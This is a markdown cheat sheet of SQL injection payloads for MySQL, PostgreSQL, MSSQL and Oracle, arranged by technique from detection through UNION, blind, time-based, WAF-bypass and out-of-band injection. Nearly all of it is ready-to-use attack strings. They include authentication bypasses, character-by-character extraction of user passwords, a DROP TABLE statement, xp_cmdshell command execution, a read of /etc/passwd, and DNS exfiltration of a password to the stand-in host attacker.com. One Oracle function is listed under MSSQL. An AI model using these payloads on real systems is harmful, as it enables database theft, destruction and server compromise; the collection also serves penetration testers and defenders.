# SQL Injection Payloads Library

## Entry Point Detection

### Basic Tests
```sql
'
"
;)
--
#
/*
'
' OR '1'='1
" OR "1"="1
') OR ('1'='1
") OR ("1"="1
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
```

### Tautology (Auth Bypass)
```sql
admin' OR '1'='1'--
admin' OR 1=1--+
' OR '1'='1' --
' or 1=1 limit 1 --
```

### Time-Based Detection
```sql
' AND SLEEP(5)--+
' AND 1=1--+
' AND 1=2--+
1' AND SLEEP(5)--+
```

## UNION-Based Injection

### MySQL
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,version(),NULL--
```

### PostgreSQL
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT version()--
1' UNION SELECT 1,2,3--
```

### MSSQL
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT @@VERSION--
1' UNION SELECT 1,2,3--
```

### Oracle
```sql
' UNION SELECT NULL FROM DUAL--
' UNION SELECT banner,NULL FROM v$VERSION--
' UNION SELECT NULL,NULL FROM DUAL--
```

## Error-Based Extraction

### MySQL
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--+
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--+
```

### PostgreSQL
```sql
' AND CAST((SELECT version()) AS int)--+
' AND 1/0--+
```

### MSSQL
```sql
' AND 1=1; SELECT @@VERSION--
' AND 1=db_name()--
```

## Blind Boolean-Based

### Extract Data Char by Char
```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'--
```

### Dichotomy
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)) BETWEEN 48 AND 57--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)) BETWEEN 97 AND 122--
```

## Time-Based Blind

### MySQL
```sql
' AND SLEEP(5)--+
' AND IF(1=1,SLEEP(5),0)--+
' AND BENCHMARK(5000000,MD5(NOW()))--+
```

### MSSQL
```sql
' AND WAITFOR DELAY '00:00:05'--
' AND IF(1=1) WAITFOR DELAY '00:00:05'--
```

### PostgreSQL
```sql
' AND pg_sleep(5)--+
' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END)--
```

## Stacked Queries

```sql
'; SELECT version();--
'; DROP TABLE users;--
'; EXEC xp_cmdshell('whoami');--
```

## WAF Bypass Techniques

### No Spaces
```sql
'/**/OR/**/1=1--+
'/**/UNION/**/SELECT/**/NULL--+
'AND/**/1=1--+
```

### No Quotes
```sql
' OR '1'='1' → 1 OR 1=1
' OR 'a'='a' → OR 0x61=0x61
```

### Case Manipulation
```sql
' UNion SELECT 1,2,3--
' ORdEr BY 1--
```

### Encoding
```sql
%27 → '
%20 → (space)
%2D%2D → --
%23 → #
```

## Authentication Bypass

### Raw MD5 Bypass (PHP)
```sql
' OR 1=1--+
' OR 'SOMETHING'='SOMETHING
ffifdyop (raw MD5 = 'or'6]!r,b)
129581926211651571912466741651878684928
```

### Hashed Passwords
```sql
admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'--
```

## Database-Specific Payloads

### MySQL
```sql
' UNION SELECT user(),database(),version()--
' UNION SELECT LOAD_FILE('/etc/passwd')--
' INTO OUTFILE '/tmp/test.txt'
```

### PostgreSQL
```sql
' UNION SELECT version()--
' UNION SELECT current_database()--
' AND 1=array_upper(ARRAY[1,2,3],1)--
```

### MSSQL
```sql
'; EXEC master..xp_cmdshell 'whoami'--
'; SELECT @@VERSION--
'; WAITFOR DELAY '00:00:05'--
```

### Oracle
```sql
' UNION SELECT banner FROM v$VERSION--
' UNION SELECT table_name FROM user_tables--
```

## OAST (Out-of-Band)

### MySQL
```sql
' UNION SELECT LOAD_FILE('\\\\attacker.com\\\\test')--
' INTO OUTFILE '\\\\attacker.com\\\\test'
```

### MSSQL
```sql
'; SELECT UTL_INADDR.get_host_address('attacker.com')--
'; EXEC master..xp_dirtree '//attacker.com/a'--
```

### DNS Exfiltration
```sql
'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\test'))--
```

## Quick Reference

| DBMS | Version | Current User | List Tables |
|------|---------|--------------|-------------|
| MySQL | VERSION() | user() | SELECT table_name FROM information_schema.tables |
| MSSQL | @@VERSION | user_name() | SELECT name FROM sysobjects |
| PostgreSQL | version() | current_user | SELECT tablename FROM pg_tables |
| Oracle | banner | user | SELECT table_name FROM user_tables |

## Always-True Conditions

```sql
' OR '1'='1
" OR "1"="1
1 OR 1=1
-1 OR 1=1
' OR 1=1 --
```